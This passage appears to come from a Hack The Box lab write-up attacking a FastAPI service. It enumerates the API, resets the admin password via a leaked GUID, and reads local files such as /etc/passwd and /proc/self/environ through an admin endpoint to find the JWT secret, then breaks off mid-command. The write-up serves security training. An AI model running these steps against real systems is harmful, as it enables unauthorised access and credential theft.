number">403,404</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125133319.png" src="img/pasted-image-20251125133319.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125133319.png" src="img/pasted-image-20251125133319.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Some routes were discovered: <code>/docs</code> and <code>/openapi.json</code> returned a <code>401</code> HTTP status code (Unauthorized) while <code>/api</code> and <code>/api/v1</code> returned a <code>200</code> HTTP status code. Next, some requests will be performed to determine how to interact with the <code>API</code>.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api
<span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1
<span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user
<span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/a
<span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/1 <span class="token operator">|</span> jq
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128171554.png" src="img/pasted-image-20251128171554.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128171554.png" src="img/pasted-image-20251128171554.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">After sending some requests to the <code>API</code>, several endpoints were revealed under <code>/api/v1</code>, specifically <code>user</code> and <code>admin</code>. When a request was sent to the <code>user</code> endpoint, it returned an error. However, when the same request was made including a character, a different error message appeared, indicating that the required value must be an integer. Indeed, when an integer value (specifically the number <strong>1</strong>) was provided in the request, a response was returned showing information about the <code>admin</code> user. This information will be considered in case it becomes valuable later on.</p></div><div class="el-p"><p dir="auto">At this point, to discover more endpoints, <code>web fuzzing</code> will be performed using <code>wfuzz</code>:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: API Enumeration Using Web Fuzzing" dir="auto" class="heading" id="TCP_Port_80_API_Enumeration_Using_Web_Fuzzing_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: API Enumeration Using Web Fuzzing</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">wfuzz <span class="token parameter variable">-u</span> <span class="token string">'http://10.10.11.161/api/v1/user/FUZZ'</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-w</span> /home/krmena/SecLists/Discovery/Web-Content/common.txt <span class="token parameter variable">--hh</span><span class="token operator">=</span><span class="token number">31,22</span> <span class="token parameter variable">-t</span> <span class="token number">500</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128151306.png" src="img/pasted-image-20251128151306.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128151306.png" src="img/pasted-image-20251128151306.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Ignoring the first result, two additional endpoints were found under the <code>user</code> endpoint: <code>login</code> and <code>signup</code>. Next, an attempt will be made to register a new user and then log in with that user.</p></div><div class="el-h1"><h1 data-heading="Exploitation" dir="auto" class="heading" id="Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Exploitation</h1></div><div class="el-h2"><h2 data-heading="TCP Port 80: Abusing API - Registering a New User" dir="auto" class="heading" id="TCP_Port_80_Abusing_API_-_Registering_a_New_User_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Abusing API - Registering a New User</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/signup <span class="token operator">|</span> jq
<span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/signup <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"example":"example"}'</span> <span class="token operator">|</span> jq
<span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/signup <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"email":"kmn9@htb.local","password":"1234"}'</span> <span class="token operator">|</span> jq
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128172110.png" src="img/pasted-image-20251128172110.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128172110.png" src="img/pasted-image-20251128172110.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, several requests were sent to determine which fields were required to register a new user. Once this information was identified, the specific request to create the user was sent, and it apparently succeeded. After the user was registered, requests will be sent to the login endpoint to attempt to log in with that user.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Abusing API – Logging in as the Created User" dir="auto" class="heading" id="TCP_Port_80_Abusing_API_–_Logging_in_as_the_Created_User_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Abusing API – Logging in as the Created User</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/login <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"email":"kmn9@htb.local","password":"1234"}'</span> <span class="token operator">|</span> jq
<span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/login <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"username":"kmn9@htb.local","password":"1234"}'</span> <span class="token operator">|</span> jq
<span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/login <span class="token parameter variable">-d</span> <span class="token string">'username=kmn9@htb.local&amp;password=1234'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128172829.png" src="img/pasted-image-20251128172829.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128172829.png" src="img/pasted-image-20251128172829.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">As in the previous process, several requests were sent to the endpoint to determine which fields were required to log in with the registered user. Once identified, the correct request was sent, and the API returned a <code>JSON Web Token (JWT)</code> to identify the user session. With this <code>JWT</code>, it may be possible to access the content of the <code>openapi.json</code> resource:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Using the Generated JWT to Read the `openapi.json` (API Schema)" dir="auto" class="heading" id="TCP_Port_80_Using_the_Generated_JWT_to_Read_the_`openapi.json`_(API_Schema)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Using the Generated JWT to Read the <code>openapi.json</code> (API Schema)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> GET <span class="token parameter variable">-s</span> http://10.10.11.161/openapi.json <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token operator">|</span> jq
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128173251.png" src="img/pasted-image-20251128173251.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128173251.png" src="img/pasted-image-20251128173251.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>JWT</code> worked to read the contents of the <code>openapi.json</code> <code>API</code> schema file. This file contains all the information about the <code>API</code>, including the endpoints, the required fields to interact with them, and the possible responses from the <code>API</code>. Since all the endpoints are under <code>/api/v1</code>, the content will be listed by filtering on this path to display all the endpoints.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> GET <span class="token parameter variable">-s</span> http://10.10.11.161/openapi.json <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token operator">|</span> jq <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'/api/v1'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128173337.png" src="img/pasted-image-20251128173337.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128173337.png" src="img/pasted-image-20251128173337.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">After listing all the endpoints and determining that guessing endpoints such as <code>/admin/exec</code>, <code>/user/SecretFlagEndpoint</code>, or <code>/admin/file</code> will not work without an admin <code>JWT</code>, an interesting endpoint appears: <code>/user/updatepass</code>. This endpoint could be used to attempt changing the admin password. The next step is to identify the required fields needed to perform this action:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> GET <span class="token parameter variable">-s</span> http://10.10.11.161/openapi.json <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token operator">|</span> jq <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'/api/v1/user/updatepass'</span> <span class="token parameter variable">-A</span> <span class="token number">15</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128174124.png" src="img/pasted-image-20251128174124.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128174124.png" src="img/pasted-image-20251128174124.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">In this case, the required parameters to perform the action are defined in <code>/components/schemas/UserPWUpdate</code>, so this will be examined next:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> GET <span class="token parameter variable">-s</span> http://10.10.11.161/openapi.json <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token operator">|</span> jq <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'"UserPWUpdate"'</span> <span class="token parameter variable">-A</span> <span class="token number">15</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128174333.png" src="img/pasted-image-20251128174333.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128174333.png" src="img/pasted-image-20251128174333.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The required parameters were successfully displayed: the <code>GUID</code> (which had been obtained previously) and the new password for the user. Since both fields can now be specified, the request to change the admin password will be sent as follows:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Abusing FastAPI – Changing the Admin Password Using the Obtained GUID" dir="auto" class="heading" id="TCP_Port_80_Abusing_FastAPI_–_Changing_the_Admin_Password_Using_the_Obtained_GUID_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Abusing FastAPI – Changing the Admin Password Using the Obtained GUID</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/updatepass <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","password":"1234"}'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128174746.png" src="img/pasted-image-20251128174746.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128174746.png" src="img/pasted-image-20251128174746.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The request apparently worked, so to verify it, a request will be sent to the <code>/login</code> endpoint to attempt to obtain a <code>JWT</code> for the admin user:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Abusing FastAPI – Logging in as the Admin User Using the Changed Password" dir="auto" class="heading" id="TCP_Port_80_Abusing_FastAPI_–_Logging_in_as_the_Admin_User_Using_the_Changed_Password_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Abusing FastAPI – Logging in as the Admin User Using the Changed Password</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/user/login <span class="token parameter variable">-d</span> <span class="token string">'username=admin@htb.local&amp;password=1234'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128175133.png" src="img/pasted-image-20251128175133.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128175133.png" src="img/pasted-image-20251128175133.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The login as the admin user was successful and the <code>JWT</code> was obtained. Using this <code>JWT</code>, the <code>/admin/exec/{command}</code> endpoint will be tested in an attempt to execute a command:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/exec/whoami <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span>
<span class="token punctuation">{</span><span class="token string">"detail"</span><span class="token builtin class-name">:</span><span class="token string">"Debug key missing from JWT"</span><span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128182556.png" src="img/pasted-image-20251128182556.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128182556.png" src="img/pasted-image-20251128182556.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The request did not work because the <code>JWT</code> no longer included a <code>debug</code> value. The current <code>JWT</code> contains only the following fields:</p></div><div class="el-pre"><pre class="language-json"><code data-line="0" class="language-json is-loaded"><span class="token punctuation">{</span>
  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"access_token"</span><span class="token punctuation">,</span>
  <span class="token property">"exp"</span><span class="token operator">:</span> <span class="token number">1765054910</span><span class="token punctuation">,</span>
  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1764363710</span><span class="token punctuation">,</span>
  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
  <span class="token property">"is_superuser"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token property">"guid"</span><span class="token operator">:</span> <span class="token string">"36c2e94a-4271-4259-93bf-c96ad5948284"</span>
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">As shown, the <code>debug</code> key is missing, while the <code>API</code> expects a <code>JWT</code> with the following structure:</p></div><div class="el-pre"><pre class="language-json"><code data-line="0" class="language-json is-loaded"><span class="token punctuation">{</span>
  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"access_token"</span><span class="token punctuation">,</span>
  <span class="token property">"exp"</span><span class="token operator">:</span> <span class="token number">1765054910</span><span class="token punctuation">,</span>
  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1764363710</span><span class="token punctuation">,</span>
  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
  <span class="token property">"is_superuser"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token property">"guid"</span><span class="token operator">:</span> <span class="token string">"36c2e94a-4271-4259-93bf-c96ad5948284"</span><span class="token punctuation">,</span>
  <span class="token property">"debug"</span> <span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">In conclusion, a new admin <code>JWT</code> must be created that includes this additional field. However, to generate a valid <code>JWT</code>, a secret key is required to sign it. To perform this task, the <code>/admin/file</code> endpoint could be used to check whether it can access local files and read any file containing the secret key used to sign the <code>JWT</code>.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Abusing FastAPI – Reading Local Files (LFI) Through the `/admin/file` Endpoint" dir="auto" class="heading" id="TCP_Port_80_Abusing_FastAPI_–_Reading_Local_Files_(LFI)_Through_the_`/admin/file`_Endpoint_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Abusing FastAPI – Reading Local Files (LFI) Through the <code>/admin/file</code> Endpoint</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/etc/passwd"}'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128175545.png" src="img/pasted-image-20251128175545.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128175545.png" src="img/pasted-image-20251128175545.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, several requests were sent to determine the correct request format. Once this was identified, a request was sent to display the contents of <code>/etc/passwd</code>, and it worked. Since the target machine also runs an <code>SSH</code> server, the <code>/etc/passwd</code> file revealed a user named <code>htb</code>. Therefore, a request will be sent to attempt to list the <code>id_rsa</code> file for this user:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/home/htb/user.txt"}'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128180002.png" src="img/pasted-image-20251128180002.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128180002.png" src="img/pasted-image-20251128180002.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>id_rsa</code> file could not be displayed. The initial hypothesis was that the file lacked sufficient permissions for reading. To determine whether this restriction applied only to <code>id_rsa</code> or to the entire <code>home</code> directory, an attempt was made to display <code>user.txt</code>, which succeeded. This suggests that the permissions were not restrictive for the whole directory but specifically for <code>id_rsa</code>.<br>
Next, a request will be sent to the <code>/proc/self/cmdline</code> path since this file returns the command used to start the current process, which is the same process that handles the request. If this does not provide useful information, another request will be sent to <code>/proc/self/environ</code> to display all the environment variables used by the process handling the request.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/proc/self/cmdline"}'</span> <span class="token operator">|</span> jq
<span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/proc/self/environ"}'</span> <span class="token operator">|</span> jq
<span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/home/htb/uhc/app/main.py"}'</span> <span class="token operator">|</span> jq
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251209215343.png" src="img/pasted-image-20251209215343.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251209215343.png" src="img/pasted-image-20251209215343.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>/proc/self/cmdline</code> file did not provide any valuable information, but <code>/proc/self/environ</code> did. It revealed the path of the <code>main.py</code> file, located at <code>/home/htb/uhc/main.py</code>. When it was listed, a large amount of information was displayed, but it was not very legible. Therefore, the <code>jq</code> command will be used to redirect this information into a local file where it is properly formatted:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span 